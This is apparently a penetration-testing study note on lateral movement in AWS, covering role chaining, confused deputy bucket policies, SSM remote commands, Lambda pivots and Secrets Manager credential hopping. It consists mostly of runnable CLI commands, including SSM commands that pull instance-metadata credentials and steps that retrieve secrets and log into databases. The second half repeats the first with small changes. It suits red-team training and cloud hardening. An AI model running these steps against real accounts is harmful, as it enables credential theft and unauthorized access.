# 06.2 — AWS Lateral Movement

## What This Note Covers

How attackers move laterally within and between AWS accounts — role assumption chains, confused deputy attacks, resource-based policy abuse, credential hopping across services, and using BloodHound for AWS to map paths.

---

## Lateral Movement via Role Assumption (sts:AssumeRole)

The primary lateral movement primitive in AWS. If an IAM identity has `sts:AssumeRole` permission targeting another role, and that role's trust policy allows it, the identity can assume that role and operate with its permissions.

```bash
# Check what roles you can assume
# Step 1: List all roles in the account
aws iam list-roles --query 'Roles[].{Name:RoleName,ARN:Arn}' --output table

# Step 2: For each role, check the trust policy
aws iam get-role --role-name ROLE_NAME \
  --query 'Role.AssumeRolePolicyDocument'

# Look for trust policies that allow YOUR identity:
# "Principal": {"AWS": "arn:aws:iam::ACCOUNT:user/YOUR_USER"}
# "Principal": {"AWS": "arn:aws:iam::ACCOUNT:role/YOUR_ROLE"}
# "Principal": {"AWS": "arn:aws:iam::ACCOUNT:root"}  ← any identity in account

# Step 3: Assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name lateral-move

# Step 4: Export the temporary credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Confirm new identity
aws sts get-caller-identity
```

### Role Chaining

You can chain role assumptions — assume Role A, then from Role A assume Role B, and so on. Each hop may give access to new permissions or new accounts.

```bash
# Chain: User → RoleA → RoleB (each has more permissions)

# Step 1: Assume RoleA
ROLE_A_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/RoleA \
  --role-session-name hop1 \
  --query 'Credentials')

export AWS_ACCESS_KEY_ID=$(echo $ROLE_A_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_A_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo $ROLE_A_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")

# Now operating as RoleA — check what it can assume
aws iam list-roles | grep -i "arn"

# Step 2: From RoleA, assume RoleB
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/RoleB \
  --role-session-name hop2

# Note: Role chaining caps session duration at 1 hour regardless of MaxSessionDuration
```

> [!warning] Role chaining resets session duration
> Each AssumeRole in a chain caps the session at 1 hour. If you need longer sessions, use the access key of the original identity to re-assume, rather than chaining.

## Confused Deputy Attack

The confused deputy problem occurs when a service (the "deputy") with broad access is tricked into acting on behalf of an attacker using a resource policy.

### AWS Cross-Service Confused Deputy

When an AWS service (like Lambda, EC2, CloudFormation) acts on behalf of you, it uses the service's own authority. A resource-based policy that allows the service principal without condition keys can be abused.

```json
// VULNERABLE S3 bucket policy — allows ANY Lambda to read this bucket
{
  "Effect": "Allow",
  "Principal": {"Service": "lambda.amazonaws.com"},
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::sensitive-bucket/*"
}

// SECURE — restricts to specific Lambda via condition keys
{
  "Effect": "Allow",
  "Principal": {"Service": "lambda.amazonaws.com"},
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::sensitive-bucket/*",
  "Condition": {
    "ArnLike": {
      "aws:SourceArn": "arn:aws:lambda:us-east-1:123456789012:function:AuthorisedFunction"
    }
  }
}
```

**Exploitation:** Create a Lambda function in your own account, configure it to access the victim's S3 bucket (allowed because the policy trusts `lambda.amazonaws.com` without restriction).

## Lateral Movement via Instance Profile

EC2 instances with instance profiles carry IAM credentials in the metadata service. Moving from one instance to another with a more-privileged profile is lateral movement.

```bash
# From a low-privilege EC2 instance:

# Step 1: Identify what roles other instances have
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].{ID:InstanceId,Profile:IamInstanceProfile.Arn}' \
  --output table

# Step 2: If a higher-privilege instance is reachable via network:
# - Exploit a vulnerability on that instance
# - Or use SSM if you have ssm:SendCommand

# Step 3: Once on the higher-privilege instance — steal its role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Step 4: Use the stolen credentials from your attack machine
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

### SSM Session Manager for Lateral Movement

If you have `ssm:StartSession` or `ssm:SendCommand`, you can access any EC2 instance registered with SSM — no SSH required, no security group changes needed.

```bash
# List instances registered with SSM
aws ssm describe-instance-information \
  --query 'InstanceInformationList[].{ID:InstanceId,Platform:PlatformType,IP:IPAddress}'

# Start an interactive session (requires SSM agent on target)
aws ssm start-session --target i-0abc123456

# Run a command on a remote instance
aws ssm send-command \
  --instance-ids i-0abc123456 \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'

# Get the command output
aws ssm get-command-invocation \
  --command-id COMMAND_ID \
  --instance-id i-0abc123456 \
  --query 'StandardOutputContent'
```

## Lateral Movement via Lambda

Lambda functions run as IAM roles. If you can invoke a Lambda function that has a more-privileged execution role, you can use it to perform actions under that role.

```bash
# Enumerate Lambda functions and their roles
aws lambda list-functions --region REGION \
  --query 'Functions[].{Name:FunctionName,Role:Role}'

# For each function, check the role's permissions
for FN in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
  ROLE=$(aws lambda get-function-configuration --function-name $FN --query Role --output text)
  echo "=== $FN → $ROLE ==="
  ROLE_NAME=$(echo $ROLE | awk -F/ '{print $NF}')
  aws iam list-attached-role-policies --role-name $ROLE_NAME 2>/dev/null
done

# Invoke a function that has a more-privileged role
# (use event injection or update the function code — see 05.3)
aws lambda invoke \
  --function-name HighPrivilegeFunction \
  --payload '{"action": "enumerate"}' \
  --cli-binary-format raw-in-base64-out \
  output.json
```

## Credential Hopping via Secrets Manager

Secrets Manager is the credential store for applications. Finding credentials for one service frequently provides access to another.

```bash
# List all secrets
aws secretsmanager list-secrets --region REGION \
  --query 'SecretList[].{Name:Name,ARN:ARN}'

# Get a secret value
aws secretsmanager get-secret-value \
  --secret-id prod/database/master \
  --query SecretString

# Common secrets that enable lateral movement:
# - RDS master credentials → full database access
# - Third-party API keys → access to external services
# - SSH private keys → access to EC2 instances
# - Other AWS access keys → pivot to another IAM identity
# - Service account JSON (GCP) stored in AWS Secrets Manager
# - Azure SP credentials stored in AWS

# Example: finding a DB credential and using it
SECRET=$(aws secretsmanager get-secret-value \
  --secret-id prod/rds/master --query SecretString --output text)
DB_HOST=$(echo $SECRET | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['host'])")
DB_USER=$(echo $SECRET | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['username'])")
DB_PASS=$(echo $SECRET | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['password'])")
mysql -h $DB_HOST -u $DB_USER -p"$DB_PASS"
```

## Using AWSPX / BloodHound for AWS

AWSPX is the BloodHound equivalent for AWS — it maps IAM relationships as a graph to find privilege escalation and lateral movement paths.

```bash
# Install
git clone https://github.com/FSecureLABS/awspx
cd awspx
pip3 install -r requirements.txt

# Collect AWS data
python3 awspx.py ingest --profile PROFILE_NAME --region us-east-1

# Run the Neo4j graph database (for BloodHound-style queries)
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/password \
  neo4j:latest

# Import collected data
python3 awspx.py graph

# Query for escalation paths (Cypher queries in Neo4j browser at localhost:7474)
# "What paths exist from User X to AdministratorAccess?"
MATCH p = shortestPath(
  (u:AWS_IAM_USER {name: "jenkins-deploy"})-[*]->(p:AWS_IAM_POLICY {name: "AdministratorAccess"})
) RETURN p
```

## Role Assumption Chains

The primary AWS lateral movement primitive. If your identity has `sts:AssumeRole` on a role, and that role's trust policy allows you, you can assume it and operate with its permissions.

```bash
# List all roles and their trust policies
aws iam list-roles --query 'Roles[].{Name:RoleName,ARN:Arn}' --output table

# Check a specific role's trust policy (who can assume it)
aws iam get-role --role-name ROLE_NAME \
  --query 'Role.AssumeRolePolicyDocument'

# Assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name lateral-move

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity  # confirm new identity
```

### Chaining Multiple Roles

```bash
# Assume RoleA first
CREDS=$(aws sts assume-role --role-arn ARN_ROLE_A --role-session-name hop1 --query Credentials)
export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")

# Now as RoleA — assume RoleB (which RoleA has permission to assume)
aws sts assume-role --role-arn ARN_ROLE_B --role-session-name hop2
```

> [!warning] Chaining caps session at 1 hour per hop regardless of MaxSessionDuration settings.

## SSM for Lateral Movement (No SSH Required)

Systems Manager Session Manager lets you access EC2 instances without open SSH ports, key pairs, or security group changes — just IAM.

```bash
# List instances registered with SSM
aws ssm describe-instance-information \
  --query 'InstanceInformationList[].{ID:InstanceId,Platform:PlatformType}'

# Start interactive shell on any SSM-registered instance
aws ssm start-session --target i-0abc123456

# Run a command remotely (no interactive session needed)
aws ssm send-command \
  --instance-ids i-0abc123456 \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'

# Retrieve command output
aws ssm get-command-invocation \
  --command-id COMMAND_ID \
  --instance-id i-0abc123456 \
  --query StandardOutputContent
```

> [!tip] SSM bypasses all traditional network controls
> Even if an EC2 instance has no public IP, is in a private subnet, and has no inbound security group rules — if it has the SSM agent running and IAM permissions to talk to SSM, you can reach it. This is the silent lateral movement path in AWS.

## Instance Profile Hopping

EC2 instances carry their IAM role credentials in the metadata service. Move from a low-privilege instance to a high-privilege one by accessing its metadata.

```bash
# Discover instance profiles across the account
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].{ID:InstanceId,Profile:IamInstanceProfile.Arn,State:State.Name}'

# For each interesting instance — check its role's permissions
PROFILE_ARN="arn:aws:iam::123456789012:instance-profile/AdminProfile"
ROLE_NAME=$(aws iam get-instance-profile \
  --instance-profile-name AdminProfile \
  --query 'InstanceProfile.Roles[0].RoleName' --output text)
aws iam list-attached-role-policies --role-name $ROLE_NAME

# Access the target instance via SSM → steal its metadata credentials
aws ssm send-command \
  --instance-ids TARGET_INSTANCE_ID \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)"]'
```

## Credential Hopping via Secrets Manager

Secrets Manager holds credentials for every downstream service. Each secret is a potential new identity.

```bash
# List all secrets
aws secretsmanager list-secrets --region REGION \
  --query 'SecretList[].Name'

# Retrieve and parse a secret
SECRET=$(aws secretsmanager get-secret-value \
  --secret-id prod/database/master \
  --query SecretString --output text)

# Parse JSON secret
echo $SECRET | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'{k}: {v}') for k,v in d.items()]"

# High-value secrets to look for:
# prod/rds/master         → DB admin credentials
# prod/api/stripe-key     → payment provider access
# infra/ssh/deploy-key    → SSH private key for instances
# cloud/gcp/sa-key        → GCP service account JSON
# cloud/azure/sp-secret   → Azure service principal credentials
```

## Lambda as a Lateral Movement Pivot

Functions with higher-privilege execution roles can be used as a proxy for actions you cannot perform directly.

```bash
# Map functions to their execution roles
aws lambda list-functions --region REGION \
  --query 'Functions[].{Name:FunctionName,Role:Role}' --output table

# Check a function's role permissions
ROLE_ARN=$(aws lambda get-function-configuration \
  --function-name TARGET_FUNCTION --query Role --output text)
ROLE_NAME=$(echo $ROLE_ARN | awk -F/ '{print $NF}')
aws iam list-attached-role-policies --role-name $ROLE_NAME
aws iam list-role-policies --role-name $ROLE_NAME

# Invoke the function with a payload designed to enumerate or escalate
aws lambda invoke \
  --function-name TARGET_FUNCTION \
  --payload '{"enumerate": true}' \
  --cli-binary-format raw-in-base64-out \
  output.json && cat output.json
```

## Confused Deputy Attack

Occurs when an AWS service acts with its own authority on behalf of an attacker because a resource policy allows the service principal without condition keys.

```json
// Vulnerable bucket policy — any Lambda in any account can read this
{
  "Effect": "Allow",
  "Principal": {"Service": "lambda.amazonaws.com"},
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::sensitive-bucket/*"
}

// Secure — restricted to specific Lambda ARN via condition
{
  "Effect": "Allow",
  "Principal": {"Service": "lambda.amazonaws.com"},
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::sensitive-bucket/*",
  "Condition": {
    "ArnLike": {
      "aws:SourceArn": "arn:aws:lambda:us-east-1:ACCOUNT:function:AuthorisedFunction"
    }
  }
}
```

**Exploitation:** Create a Lambda in your account — the vulnerable policy lets it read the victim's bucket.
